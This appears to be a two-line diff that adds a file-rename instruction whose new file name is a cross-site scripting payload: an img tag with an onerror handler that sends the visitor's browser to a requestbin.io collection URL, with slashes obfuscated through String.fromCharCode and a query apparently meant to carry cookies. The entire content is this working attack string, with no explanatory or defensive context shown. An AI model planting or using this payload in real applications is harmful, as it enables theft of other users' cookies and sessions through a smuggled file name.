@@ -1,0 +1,2 @@
+rename file:
+<img src=x onerror=(document.location='https:'+String.fromCharCode(47)+String.fromCharCode(47)+'requestbin.io'+String.fromCharCode(47)+'1i4kud41?cookieOuAutres')>.txt
